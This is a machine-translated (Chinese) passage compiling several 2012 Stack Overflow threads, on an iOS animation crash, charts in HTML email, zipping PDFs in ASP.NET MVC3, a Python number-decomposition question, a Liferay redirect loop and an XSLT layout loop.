动画代码执行如下。

```
 BOOL lastPage = NO;
    BOOL ordersEmpty = NO;
    if (self.views.count == 1){
        ordersEmpty = YES;
        lastPage = YES;
    }

    UIViewController *controller2;
    if (self.views.count == page+1 && !ordersEmpty){
        lastPage = YES;
        controller2 = [self.views objectAtIndex:page-1];
    } else if (!ordersEmpty){
        controller2 = [self.views objectAtIndex:page+1];
    }
    [UIView animateWithDuration:1.5 animations:^{
        CGRect frame = controller.view.frame;
        frame.origin.y = frame.size.height + 100;
        controller.view.frame = frame;

        if (lastPage == NO){
            CGRect frame2 = controller2.view.frame;
            frame2.origin.x = frame.origin.x;
            controller2.view.frame = frame2;
        }else{
            // [self.scrollView scrollRectToVisible:controller2.view.frame animated:YES];
        }

    } completion:^(BOOL value){
        [controller.view removeFromSuperview];
        [self.views removeObject:controller];
        totalPages.text = [NSString stringWithFormat:@"%i", self.views.count];
        // currentPage.text = [NSString stringWithFormat:@"%i", 
        self.pageControl.numberOfPages = self.views.count;
        if (lastPage && !ordersEmpty){
            [self.scrollView scrollRectToVisible:controller2.view.frame animated:YES];
            lastPageMoving = YES;
        }else if (ordersEmpty){
            UILabel *label = [[UILabel alloc] initWithFrame:CGRectMake(0, 0, 320, 30)];
            label.text = @"There are currently no notifications";
            label.textAlignment = UITextAlignmentCenter;
            label.center = CGPointMake(self.scrollView.frame.size.width/2, self.scrollView.frame.size.height/3);
            [self.scrollView addSubview:label];
            [label release];
            ofPages.text = @"";
            totalPages.text = @"";
            currentPage.text = @"";
            self.scrollView.contentSize = CGSizeMake(320, 267);
        }

        int i = 0;
        for (UIViewController *c in self.views)
        {
            c.view.frame = CGRectMake(self.scrollView.frame.size.width * i, 0, c.view.frame.size.width, c.view.frame.size.height);
            i++;
        }

        if (controller2 != nil)
        {
            if ([controller2 isKindOfClass:[CancelledController class]]) {
                self.acceptButton.hidden = YES;
                [self.declineButton setTitle:@"Close" forState:UIControlStateNormal];
                [self.declineButton setTitle:@"Close" forState:UIControlStateHighlighted];
            }else{
                self.acceptButton.hidden = NO;
                [self.declineButton setTitle:@"Decline" forState:UIControlStateNormal];
                [self.declineButton setTitle:@"Decline" forState:UIControlStateHighlighted];
            }
        }
    }]; 
```

动画工作正常，但删除的视图被释放

当最后一个视图被接受时，应用程序会在 [UIView animateWithDuration:animations:completion] 方法调用处以 exc_bad_access 崩溃。

NSZombies 没有检测到确切的泄漏点/原因..

经过广泛的研究，我认为这可能是由于使用了块......内存管理很好，因为如果我过度释放任何东西，NSZombies 会指出它。

（代码在模拟器中运行良好 - 没有任何错误）

我制作了一个视频来演示动画是如何工作的。它是模拟器的，所以这里没有错误，但是当我在设备上运行它时，只要我按下关闭按钮，应用程序就会崩溃。

一个有趣的事情是，如果我先关闭第二个订单然后再接受第一个订单，代码也可以正常工作=（确实非常令人困惑..!!

[http://www.mediafire.com/?w1up9g9u6w0ucrn](http://www.mediafire.com/?w1up9g9u6w0ucrn)

该项目针对 iOS 4.0

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T13:57:56.560

您可以首先将声明更改`UIViewController *controller2`为`UIViewController *controller2 = nil;`，然后最好只使用属性，因此以下行：

```
[controller.view removeFromSuperview];
[self.views removeObject:controller]; 
```

将通过调用此属性的访问器方法来替换，如果 ivar`controller`是否保留，您和我们将有一个确切的想法。这对您正在使用的所有其他 ivars 有效：`lastPageMoving`, `ofPages`,`totalPages`等`currentPage`- 只需将它们更改为属性并确保它们的正确内存管理。

# html - 电子邮件图表 - 条形图、面积图和饼图

> ID：10862767
> 
> 赞同：11
> 
> 时间：2012-06-02T13:45:59.203
> 
> 标签：html, css, charts, highcharts, google-visualization

我想在我的电子邮件中显示图表 - 条形图、面积图、饼图。我尝试了一些带有内联样式的基于 CSS 的图表，但它仍然没有显示出来。这是在电子邮件中显示图表的最佳方式。

图片是唯一的选择吗？

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-06-03T10:18:45.237

单独发送 HTML 电子邮件是一项棘手的工作。各种邮件客户端的各种标准和限制以及大量安全限制使得创建跨浏览器/客户端 HTML 电子邮件传递变得困难。作为一个经验法则，我觉得您使用的技术越旧，它在邮件客户端之间的统一复制就越好。“旧”技术是指表格驱动的 HTML、具有非常基本的 CSS 属性的内联 CSS、无脚本等。

**您在电子邮件中使用图表的可能性：**

1.  Flash 图表 - 这将被几乎所有邮件客户端阻止。
2.  HTML5 图表 - 大多数电子邮件客户端（包括基于 Web 的）将阻止 SVG，并且还会使“画布”驱动的图表变得无用，因为 JavaScript 肯定会被阻止。
3.  纯 HTML 和 CSS 图表可能有效，但由于大多数流行的图表库使用高级 HTML 功能，大多数图表在电子邮件中无法正常呈现。
4.  基于图像的图表 - 您最好的选择是图表的图像。由于内联图像在电子邮件客户端中广泛发送，我的建议是生成一个图表作为图像，然后将其作为 HTML 邮件的一部分。大多数图表组件（如 FusionCharts、Highcharts 等）允许您将图表生成为图像。

如果您打算使用基于图像的图表但又希望它是动态生成的，一个好方法是创建一个服务器端脚本，您可以通过查询字符串向该脚本发送数据，它会返回一个图像使用此数据生成的图表。

*如果您在部署基于图像的图表时遇到任何问题，那么您可以考虑使用简单的基于 HTML 的图表`<table>`和`<div>`内联 CSS 来生成图表。可悲的是，我认为市场上没有现成的组件。*

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2018-09-14T10:26:03.790

*免责声明：我是 Image-Charts 的创始人*。

作为一个独立黑客，每次我启动一个新的 SaaS（从头开始重写图像生成后端，然后通过电子邮件发送图表）时，我都会遇到和你一样的问题。

这就是为什么我**[为 Google Image Charts 构建了一个替代品，](https://image-charts.com)** 并在其上添加了[gif 动画](https://documentation.image-charts.com/reference/animation/)（电子邮件中的图表动画很棒！！）。

它被称为图像图表。不再有服务器端图表渲染的痛苦，没有缩放问题，它的速度非常快，1 个 URL = 1 个图像图表。

[![在此处输入图像描述](../Images/f49cf8e41e744ef54287631d741b7f9a.png)](https://image-charts.com/chart?cht=bvg&chd=t:10,15,25,30,40,80&chs=700x300&chxt=x,y&chxl=0:%7CMarch%20%2718%7CApril%20%2718%7CMay%20%2718%7CJune%20%2718%7CJuly%20%2718%7CAugust%20%2718%7C&chdl=Visitors%20(in%20thousands)&chf=b0,lg,90,05B142,1,0CE858,0.2&chxs=1N**K&chtt=Visitors%20report&chma=0,0,10,10&chl=%7C%7C%7C%7C+33%25%20!%7Cx2%20!&chof=stackoverflow-39987235)

[![在此处输入图像描述](../Images/6f980dd6af8d50ece84c8f975050e087.png)](https://image-charts.com/chart?chs=700x300&chxt=x,y&chl=2018%7C2017%7C2015&chd=t:60,40,20&cht=pa&chdl=Image%7CCharts%7CRocks&chf=ps0-0,lg,45,ffeb3b,0.2,f443367C,1%7Cps0-1,lg,45,8bc34a,0.2,0096887C,1%7Cps0-2,lg,45,EA469E,0.2,03A9F47C,1&chan&chof=stackoverflow-39987235)

[![在此处输入图像描述](../Images/f67b7d6cdea41b04e341521c1d849ef0.png)](https://image-charts.com/chart?cht=lc&chd=s:ceAELfJHHHUjueuudde&chco=76A4FB&chls=2.0,0.0,0.0&chxt=x,y&chs=700x200&chg=20,51&chan&chof=stackoverflow-39987235)

[![在此处输入图像描述](../Images/4a21cc4d402143f3cc1784f4c2e7042c.png)](https://image-charts.com/chart?chs=700x200&cht=gv&chl=digraph%20%7Ba%20-%3E%20b%5Blabel=%220.2%22,weight=%220.2%22%5D;a%20-%3E%20c%5Blabel=%220.4%22,weight=%220.4%22%5D;c%20-%3E%20b%5Blabel=%220.6%22,weight=%220.6%22%5D;c%20-%3E%20e%5Blabel=%220.6%22,weight=%220.6%22%5D;e%20-%3E%20e%5Blabel=%220.1%22,weight=%220.1%22%5D;e%20-%3E%20b%5Blabel=%220.7%22,weight=%220.7%22%5D;%7D&chof=stackoverflow-39987235)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2015-11-25T03:12:34.783

晚了 3.5 年，但我在 Ramen 的团队最近将一些内部功能分离到一个独立的产品中：[https ://ChartURL.com](https://ChartURL.com)

您可以使用“加密 URL”方案即时生成图表，或者您可以向我们发送大量数据，我们会返回一个可解析为图像的短 URL。

有一个免费套餐，但是一旦您每月获得超过几百张图片，我们会要求您开始付费。不过，我们确实努力使定价尽可能友好。因此，如果用例对您的业务至关重要，那么它应该是显而易见的。

[它建立在http://C3js.org](http://C3js.org)之上，因此您可以灵活地生成内容。

这些 URL 可用于网络应用程序和移动应用程序，但最初的意图是电子邮件图表，所以我希望这会有所帮助！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-12-07T17:20:55.803

如果您习惯于在 Javascript 中构建图表，那么将大量这些图表呈现为图像在技术上是相当复杂的。您需要选择一些渲染服务（例如无头浏览器或画布实现）并进行大量故障排除。

我经历了这个过程并发布了开源[QuickChart](https://quickchart.io)，这是一个获取数据并生成适合电子邮件的静态图像的 Web API。你可以在这里看到这个项目：[https ://github.com/typpo/quickchart](https://github.com/typpo/quickchart)

它基于 Chart.js API。给定这样的图表配置：

```
{
  type: 'bar',
  data: {
    labels: [2012, 2013, 2014, 2015, 2016],
    datasets: [{
      label: 'Data',
      data: [12, 6, 5, 18, 12]
    }]
  }
} 
```

将其填入 URL：[https://quickchart.io/chart?bkg=white&c={ type: 'bar', data: { labels: [2012, 2013, 2014, 2015, 2016], datasets: [{ label: '数据'，数据： [12, 6, 5, 18, 12] }] }}](https://quickchart.io/chart?bkg=white&c=%2F%2F%20Edit%20me%0A%7B%0A%20%20type%3A%20%27bar%27%2C%0A%20%20data%3A%20%7B%0A%20%20%20%20labels%3A%20%5B2012%2C%202013%2C%202014%2C%202015%2C%202016%5D%2C%0A%20%20%20%20datasets%3A%20%5B%7B%0A%20%20%20%20%20%20label%3A%20%27Data%27%2C%0A%20%20%20%20%20%20data%3A%20%5B12%2C%206%2C%205%2C%2018%2C%2012%5D%0A%20%20%20%20%7D%5D%0A%20%20%7D%0A%7D)

它将返回一个静态图像：

[![电子邮件的图表图像](../Images/86747844a97ed624ace1699374a2a32c.png)](https://i.stack.imgur.com/PFTWu.png)

[在Quickchart.io](https://quickchart.io)上有一个托管（也是免费的）版本，但您可以自己在 Docker 上或直接从源代码运行 Web 服务。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2018-10-01T13:11:49.577

*免责声明：我是Charty的创始人*

您可以尝试使用 Charty ，它可以在几秒钟内创建交互式图表，并且支持 25 种以上的图表类型。

链接：[查蒂](https://charty.live)

# c# - MVC3 将多个 pdf 作为 zip 文件返回

> ID：10862768
> 
> 赞同：3
> 
> 时间：2012-06-02T13:46:03.830
> 
> 标签：c#, asp.net-mvc-3, file, zip, itextsharp

我有一个视图，它返回一个包含多个页面的 pdf（使用 iTextSharp），但现在我必须更改它，以便每个页面都是一个单独的 pdf（具有它自己的唯一标题）并返回一个 zip 文件。

我的原始代码如下所示：

```
public FileStreamResult DownloadPDF()
{
    MemoryStream workStream = new MemoryStream();
    Document document = new Document();
    PdfWriter.GetInstance(document, workStream).CloseStream = false;
    document.Open();

    // Populate pdf items

    document.Close();

    byte[] byteInfo = workStream.ToArray();
    workStream.Write(byteInfo, 0, byteInfo.Length);
    workStream.Position = 0;

    FileStreamResult fileResult = new FileStreamResult(workStream, "application/pdf");
    fileResult.FileDownloadName = "fileName";

    return fileResult;
} 
```

使用 gzip 压缩文件看起来很简单，但我不知道如何 gzip 多个文件并将其作为一个 zip 文件返回。或者我应该使用 gzip 以外的东西，比如 dotnetzip 或 sharpzip？

提前致谢！

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-06-05T03:20:50.460

如果您的解决方案有效，那么最简单的方法就是保持原样。

另一方面，我确实对您使用 DoTNetZip 库有一些评论。

首先，您的代码有点误导。在这个部分：

```
byte[] byteInfo = workStream.ToArray();                        

zip.Save(workStream);                        

workStream.Write(byteInfo, 0, byteInfo.Length);                        
workStream.Position = 0; 
```

...您正在将 workStream 读入一个数组。但是此时，您还没有向 workStream 写入任何内容，因此该数组是空的，长度为零。然后将 zip 保存到工作流中。然后将数组（长度为零）写入同一个工作流。这是一个 NO-OP。最后你重置位置。

您可以将所有这些替换为：

```
zip.Save(workStream);                        
workStream.Position = 0; 
```

这不是 DotNetZip 本身的问题，这只是您对流操作的误解。

好的，接下来，您将不必要地分配临时缓冲区（内存流）。将 MemoryStream 视为只是一个字节数组，上面有一个 Stream 包装器，以支持 Write()、Read()、Seek() 等。本质上，您的代码是将数据写入该临时缓冲区，然后告诉 DotNetZip 将临时缓冲区中的数据读取到其自己的缓冲区中以进行压缩。你不需要那个临时缓冲区。它按照您的方式工作，但它可能更有效。

DotNetZip 有一个`AddEntry()`接受写入委托的重载。委托是 DotNetZip 调用的一个函数，用于告诉您的应用程序将条目内容写入 zip 存档。您的代码写入未压缩的字节，DotNetZip 压缩并将它们写入输出流。

在该编写器委托中，您的代码直接写入 DotNetZip 流 - 由 DotNetZip 传递给委托的流。没有中间缓冲。很好的效率。

请记住有关关闭的规则。如果您在 for 循环中调用此 writer 委托，则需要有一种方法来检索与委托中的 zipentry 对应的“bla”。委托在被调用之前不会被执行`zip.Save()`！所以你不能依赖循环中'bla'的值。

```
public FileStreamResult DownloadPDF() 
{ 
    MemoryStream workStream = new MemoryStream(); 
    using(var zip = new ZipFile()) 
    {
        foreach(Bla bla in Blas) 
        { 
            zip.AddEntry(bla.filename + ".pdf", (name,stream) => {
                    var thisBla = GetBlaFromName(name);
                    Document document = new Document(); 
                    PdfWriter.GetInstance(document, stream).CloseStream = false; 

                    document.Open(); 

                    // write PDF Content for thisBla into stream/PdfWriter 

                    document.Close(); 
                });
        } 

        zip.Save(workStream); 
    }
    workStream.Position = 0; 

    FileStreamResult fileResult = new FileStreamResult(workStream, System.Net.Mime.MediaTypeNames.Application.Zip); 
    fileResult.FileDownloadName = "MultiplePDFs.zip"; 

    return fileResult; 
} 
```

最后，我不是特别喜欢你`FileStreamResult`从 a 中创建的 a `MemoryStream`。问题是您的整个 zip 文件都保存在内存中，这对内存使用非常不利。如果您的 zip 文件很大，您的代码会将所有内容保留在内存中。

我对 MVC3 模型知之甚少，无法知道其中是否有对此有所帮助的东西。如果没有，您可以[使用匿名管道来反转流的方向](https://stackoverflow.com/a/2729128/48082)，并且无需将所有压缩数据保存在内存中。

这就是我的意思：创建一个`FileStreamResult`要求您提供一个可读流。如果您使用 MemoryStream，为了使其可读，您需要先对其进行写入，然后返回位置 0，然后再将其传递给`FileStreamResult`构造函数。这意味着该 zip 文件的所有内容必须在某个时间点连续保存在内存中。

假设您可以向`FileStreamResult`构造函数提供一个可读流，这将允许读者在您写入它的那一刻准确地阅读。这就是匿名管道流的作用。它允许您的代码使用可写流，而 MVC 代码获取其可读流。

这是它在代码中的样子。

```
static Stream GetPipedStream(Action<Stream> writeAction) 
{ 
    AnonymousPipeServerStream pipeServer = new AnonymousPipeServerStream(); 
    ThreadPool.QueueUserWorkItem(s => 
    { 
        using (pipeServer) 
        { 
            writeAction(pipeServer); 
            pipeServer.WaitForPipeDrain(); 
        } 
    }); 
    return new AnonymousPipeClientStream(pipeServer.GetClientHandleAsString()); 
} 

public FileStreamResult DownloadPDF() 
{
    var readable = 
        GetPipedStream(output => { 

            using(var zip = new ZipFile()) 
            {
                foreach(Bla bla in Blas) 
                { 
                    zip.AddEntry(bla.filename + ".pdf", (name,stream) => {
                        var thisBla = GetBlaFromName(name);
                        Document document = new Document(); 
                        PdfWriter.GetInstance(document, stream).CloseStream = false; 

                        document.Open(); 

                        // write PDF Content for thisBla to PdfWriter

                        document.Close(); 
                    });
                } 

                zip.Save(output); 
            }
        }); 

    var fileResult = new FileStreamResult(readable, System.Net.Mime.MediaTypeNames.Application.Zip); 
    fileResult.FileDownloadName = "MultiplePDFs.zip"; 

    return fileResult; 
} 
```

我还没有尝试过，但它应该可以工作。与您编写的内容相比，这有一个优势，即内存效率更高。缺点是它相当复杂，使用命名管道和几个匿名函数。

仅当 zip 内容在 >1MB 范围内时，这才有意义。如果你的拉链比那个小，那么你可以按照我上面展示的第一种方式来做。

* * *

**附录**

*为什么不能依赖`bla`匿名方法内的值？*

有两个关键点。首先，foreach 循环定义了一个名为 的变量`bla`，它在每次循环中都取不同的值。看起来很明显，但值得明确说明。

其次，匿名方法作为*参数*传递给该`ZipFile.AddEntry()`方法，并且不会在 foreach 循环运行时运行。事实上，匿名方法被重复调用，每次添加的条目一次，在 `ZipFile.Save()`. `bla`如果您在匿名方法中引用，它将获得分配给*的最后一个值*`bla`，因为该值`bla`在`ZipFile.Save()`运行时保持不变。

造成困难的是延迟执行。

您想要的是`bla`在调用匿名函数时可以访问 foreach 循环中的每个不同值 - 稍后，在 foreach 循环之外。您可以使用实用方法 ( `GetBlaForName()`) 来做到这一点，就像我在上面展示的那样。您也可以使用额外的闭包来执行此操作，如下所示：

```
Action<String,Stream> GetEntryWriter(Bla bla)
{
   return new Action<String,Stream>((name,stream) => {
     Document document = new Document();  
     PdfWriter.GetInstance(document, stream).CloseStream = false;  

     document.Open();  

     // write PDF Content for bla to PdfWriter 

     document.Close();  
  };
}

foreach(var bla in Blas)
{
  zip.AddEntry(bla.filename + ".pdf", GetEntryWriter(bla));
} 
```

`GetEntryWriter`返回一个方法——实际上是一个动作，它只是一个类型化的方法。每次循环时，都会创建该 Action 的一个新实例，并且它为 bla 引用不同的值。该动作直到 时才被调用`ZipFile.Save()`。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-03T13:17:54.903

我最终使用[DotNetZip](http://dotnetzip.codeplex.com/)而不是 SharpZipLib，因为解决方案更简单。这是我最终做的事情，它工作正常，但是如果有人有任何建议/更改，我很乐意在这里。

```
public FileStreamResult DownloadPDF()
{
    MemoryStream workStream = new MemoryStream();
    ZipFile zip = new ZipFile();

    foreach(Bla bla in Blas)
    {
        MemoryStream pdfStream = new MemoryStream();
        Document document = new Document();
        PdfWriter.GetInstance(document, pdfStream).CloseStream = false;

        document.Open();

        // PDF Content

        document.Close();
        byte[] pdfByteInfo = pdfStream.ToArray();
        zip.AddEntry(bla.filename + ".pdf", pdfByteInfo);
        pdfStream.Close();
    }

    zip.Save(workStream);
    workStream.Position = 0;

    FileStreamResult fileResult = new FileStreamResult(workStream, System.Net.Mime.MediaTypeNames.Application.Zip);
    fileResult.FileDownloadName = "MultiplePDFs.zip";

    return fileResult;
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-02T17:51:42.323

正如**交钥匙**所说 - SharpZipLib 非常适合多个文件和内存流。只需 foreach 您需要压缩的文件并将它们添加到存档。这是示例：

```
 // Save it to memory
        MemoryStream ms = new MemoryStream();
        ZipOutputStream zipStream = new ZipOutputStream(ms);

        // USE THIS TO CHECK ZIP :)
        //FileStream fileOut = File.OpenWrite(@"c:\\test1.zip");
        //ZipOutputStream zipStream = new ZipOutputStream(fileOut);

        zipStream.SetLevel(0);

        // Loop your pages (files)
        foreach(string filename in files)
        {
            // Create and name entry in archive
            FileInfo fi = new FileInfo(filename);
            ZipEntry zipEntry = new ZipEntry(fi.Name);
            zipStream.PutNextEntry(zipEntry);

            // Put entry to archive (from file or DB)
            ReadFileToZip(zipStream, filename);

            zipStream.CloseEntry();

        }

        // Copy from memory to file or to send output to browser, as you did
        zipStream.Close(); 
```

我不知道您如何获取要压缩的信息，所以我认为该文件没问题:)

```
 /// <summary>
    /// Reads file and puts it to ZIP stream
    /// </summary>
    private void ReadFileToZip(ZipOutputStream zipStream, string filename)
    {
        // Simple file reading :)
        using(FileStream fs = File.OpenRead(filename))
        {
            StreamUtils.Copy(fs, zipStream, new byte[4096]);
        }
    } 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-02T13:54:52.420

我建议使用 SharpZipLib 压缩成标准的 zip 文件。将文件放入临时文件夹并使用 FastZip 类制作 zip。

# ios - webkit-transform translate3d & webkit-overflow-scrolling touch - 没有点击事件？

> ID：10862771
> 
> 赞同：2
> 
> 时间：2012-06-02T13:46:22.273
> 
> 标签：ios, webkit

我正在尝试构建一个 Web 应用程序，模拟向左/向右滑动页面的原生 iOS UI 范例。

我有许多水平堆叠的 div 并`-webkit-transform`用于在它们之间移动。

其中一些 div 可能比屏幕高度长，因此需要一个滚动条（而另一些则不需要）。我不想要一个主窗口滚动条——我想要每个 div 上有一个单独的滚动条。我正在`-webkit-overflow-scrolling:touch`尝试实现这一目标。

单独这两个声明工作正常，但一起使用我发现所有 iPad 触摸事件停止 - 链接和表单输入点击不做任何事情，文本选择不会选择 - 除了滚动之外，屏幕完全被锁定。在台式电脑上运行良好。

这是溢出滚动的已知错误吗？好像是个大的。如有必要，我可以设置一个 jsFiddle 演示。如果有的话，我很乐意使用另一种构建此 UI 的方法。

# python - Python从一组数字中获取数字

> ID：10862776
> 
> 赞同：3
> 
> 时间：2012-06-02T13:46:56.910
> 
> 标签：python, numbers

我想知道我可以从一组数字中构建一个数字的次数：

```
possible_numbers = 1, 2, 4, 8, 16 
```

如果我想要 23 号，我需要

```
1x 16
0x 8
1x 4
1x 2
1x 1 
```

Python中是否有任何内置函数可以做到这一点？

编辑：数字固定为 1,2,4,8,16,32,64,128。可以进行多项选择。

由于没有内置函数，我将自己编写代码。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-06-02T13:52:08.470

假设可能的数字始终是 2 的幂，您基本上希望将数字转换为二进制格式。这很容易使用内置的[bin 功能](http://docs.python.org/release/3.1.5/library/functions.html#bin)：

```
>>> mylist = [int(x) for x in bin(23)[2:]]
>>> print mylist
[1, 0, 1, 1, 1] 
```

要获得与您在问题中显示的完全相同的输出：

```
>>> for i, j in enumerate(mylist):
...     print '%ix %i' % (j, 2**(len(mylist)-i-1))
...
1x 16
0x 8
1x 4
1x 2
1x 1 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-02T14:03:01.953

假设您的数字不限于 2 的幂，则此解决方案应该有效。它绝对不是抛光或高效的，但它确实有效。

```
#!/usr/bin/env python

import sys

def factors(desired, numbers):
    if desired == 0:
        return []
    elif desired < 0:
        return None

    for number in sorted(numbers, reverse=True):
        f = factors(desired - number, numbers)
        if f is not None:
            f.append(number)
            return f

if __name__ == "__main__":
    n = int(sys.argv[1])
    possibles = map(int, sys.argv[2].split())
    f = factors(n, possibles)
    print f

    for i in sorted(possibles, reverse=True):
        print "{0}x {1}".format(f.count(i), i) 
```

这里有些例子：

```
$ python test.py 23 "1 2 4 8 16"
[1, 2, 4, 16]
1x 16
0x 8
1x 4
1x 2
1x 1

$ python test.py 23 "1 2 5 8 16"
[2, 5, 16]
1x 16
0x 8
1x 5
1x 2
0x 1

$ python test.py 23 "1 2 3 8 16"
[1, 3, 3, 16]
1x 16
0x 8
2x 3
0x 2
1x 1

$ python test.py 23 "1 2 3 8 17"
[3, 3, 17]
1x 17
0x 8
2x 3
0x 2
0x 1 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-02T14:27:45.493

如果不允许重复，则有一种使用 powerset 的巧妙方法（以及从[http://rosettacode.org/wiki/Power_set#Python](http://rosettacode.org/wiki/Power_set#Python)抄录的一个不错的 powerset 函数）：

```
def list_powerset(lst):
    return reduce(lambda result, x: result + [subset + [x] for subset in result], lst, [[]])

def powerset(s):
    return frozenset(map(frozenset, list_powerset(list(s))))

def valid_combos(num, lst):
    return filter(lambda x: sum(x) == num, powerset(lst)) 
```

这仅在数字只出现一次时才有效，但我仍然认为这是一个有趣的解决方案。:)

# iphone - iphone - 标签栏设置 imagetintcolor (offstate)

> ID：10862778
> 
> 赞同：1
> 
> 时间：2012-06-02T13:47:16.997
> 
> 标签：iphone, objective-c, tabbar

我看到有`[tabBar setSelectedImageTintColor:[UIColor]]`哪个很棒，但是我如何为 offstate 设置 imagetintcolor 呢？我似乎找不到`[tabBar setImageTintColor]`or `[tabBar setUnSelectedImageTintColor]`。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T14:16:14.133

[查看UITabBarItem](https://developer.apple.com/library/IOs/ipad/#documentation/UIKit/Reference/UITabBarItem_Class/Reference/Reference.html)文档的“管理完成和选定的图像”任务部分。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-08T11:32:12.957

对于快速剪切'n粘贴：

```
NSArray *tabBarImages = [[NSArray alloc] initWithObjects:@"tab_a.png",
                         @"tab_b.png",
                         @"tab_c.png",
                         @"tab_d.png",
                         @"tab_e.png",
                         nil];

for (uint i=0;i<[_tabBarController.tabBar.items count];i++)
{
    UITabBarItem *uitbi = [_tabBarController.tabBar.items objectAtIndex:i];

    NSString *imageRef = [tabBarImages objectAtIndex:i];
    [uitbi setFinishedSelectedImage:[UIImage imageNamed:imageRef] withFinishedUnselectedImage:[UIImage imageNamed:imageRef]];

} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-02T13:51:46.387

要将按钮的外观和感觉更改为该详细级别，您将必须实现自己的自定义 UITabBar。这是一个很好的参考：

[http://idevrecipes.com/2010/12/16/raised-center-tab-bar-button/](http://idevrecipes.com/2010/12/16/raised-center-tab-bar-button/)

# browser - 带有“此网页有重定向循环”的 Liferay 门户

> ID：10862780
> 
> 赞同：2
> 
> 时间：2012-06-02T13:47:22.083
> 
> 标签：browser, liferay, friendly-url, redirect-loop

我的门户[http://fut5.co](http://fut5.co)配置了 Liferay 6.1。但是，从 Web 浏览器查看时会出现问题。我第一次访问该站点时一切正常，但是当我再次尝试访问时，会出现下一条消息：

“此网页有重定向循环”

为了重现这个问题，我每次都必须清除浏览器的缓存。返回我的网站时，这会影响我的访问者。

第一次：fut5.co -> fut5.co/home 第二次：fut5.co -> 重定向循环

我将友好的 url 配置为：/portal 公共页面：fut5.co 私人页面：fut5

我该如何解决这种行为？你怎么看？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-09-18T15:43:14.997

尝试将“控制面板 > 门户设置 > 导航”上的“主页 URL”属性设置为“/”。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-10T16:15:23.140

我定期遇到这个问题，Liferay 被破坏了。我发现唯一的解决方案是完全重新安装 Liferay 实例。我希望一旦我的应用程序进入生产环境就不会发生这种情况。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-11T17:31:05.710

当您将网站的友好 URL 从“访客”更改为其他内容时，我已经看到了这种情况。解决此问题的一种方法是，如果您将其重命名为“某物”，则使用 to`http://localhost:8080/web/something`而不是`http://localhost:8080/`- 然后不会发生重定向循环。可能已经为此提交了一个问题（编辑：[LPS-27051](https://issues.liferay.com/browse/LPS-27051)，在 6.1 GA2 中修复）。最快的解决方法是不重命名默认站点。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-05T19:20:48.633

您能否在 portal-ext.properties 中检查此属性？现在，当您点击直接 url 时，它默认为 /web/guest，因此它正在重定向。

> ```
> #
> # Specify the site name that will default to the company's virtual host.
> # If the specified site has a virtual host, then that will take precedence.
> # If it does not, then it will use the company's virtual host. This property
> # is useful to remove "/web/guest" (or any other site) from the default URL.
> # For example, if this property is not set, then the default URL may be
> # http://localhost:8080/web/guest/home. If this property is set, then the
> # default URL may be http://localhost:8080/home.
> #
> virtual.hosts.default.site.name=Guest 
> ```

# xslt - XSLT - 带变量的循环、计数、位置（）

> ID：10862781
> 
> 赞同：4
> 
> 时间：2012-06-02T13:47:26.787
> 
> 标签：xslt, loops, count

提前致歉——这里是新手，在阅读了这里的几乎所有 XSLT 线程后都在苦苦挣扎。所以我迫切需要几种阿司匹林和你的指导！！

我有三个需要使用 xslt 1.0 版处理的传入参数/变量。

```
<!-- Variables in the XSL -->
<xsl:variable name="tw">125</xsl:variable>
<xsl:variable name="rows">4</xsl:variable>
<xsl:variable name="cols">6</xsl:variable> 
```

我想在 HTML 的“**背景位置”中得到****计算值**（像素），如下所示： -

 **```
<div style="background-position:-0px -0px;"><img src="images/thumbs/1.jpg" alt="one" /></div>
<div style="background-position:-125px -0px;"><img src="images/thumbs/2.jpg" alt="two" /></div>
<div style="background-position:-250px -0px;"><img src="images/thumbs/3.jpg" alt="three" /></div>
<div style="background-position:-375px -0px;"><img src="images/thumbs/4.jpg" alt="four" /></div>
<div style="background-position:-500px -0px;"><img src="images/thumbs/5.jpg" alt="five" /></div>
<div style="background-position:-625px -0px;"><img src="images/thumbs/6.jpg" alt="six" /></div>

<div style="background-position:-0px -125px;"><img src="images/thumbs/7.jpg" alt="seven" /></div>
<div style="background-position:-125px -125px;"><img src="images/thumbs/8.jpg" alt="eight" /></div>
<div style="background-position:-250px -125px;"><img src="images/thumbs/9.jpg" alt="nine" /></div>
<div style="background-position:-375px -125px;"><img src="images/thumbs/10.jpg" alt="ten" /></div>
<div style="background-position:-500px -125px;"><img src="images/thumbs/11.jpg" alt="11" /></div>
<div style="background-position:-625px -125px;"><img src="MIB/images/thumbs/12.jpg" alt="12" /></div>

<div style="background-position:-0px -250px;"><img src="images/thumbs/13.jpg" alt="13" /></div>
<div style="background-position:-125px -250px;"><img src="/mages/thumbs/14.jpg" alt="14" /></div>
<div style="background-position:-250px -250px;"><img src="images/thumbs/15.jpg" alt="15" /></div>
<div style="background-position:-375px -250px;"><img src="images/thumbs/16.jpg" alt="16" /></div>
<div style="background-position:-500px -250px;"><img src="images/thumbs/17.jpg" alt="17" /></div>
<div style="background-position:-625px -250px;"><img src="images/thumbs/18.jpg" alt="18" /></div>

<div style="background-position:-0px -375px;"><img src="images/thumbs/19.jpg" alt="19" /></div>
<div style="background-position:-125px -375px;"><img src="images/thumbs/20.jpg" alt="20" /></div>
<div style="background-position:-250px -375px;"><img src="images/thumbs/21.jpg" alt="21" /></div>
<div style="background-position:-375px -375px;"><img src="images/thumbs/22.jpg" alt="22" /></div>
<div style="background-position:-500px -375px;"><img src="images/thumbs/23.jpg" alt="23" /></div>
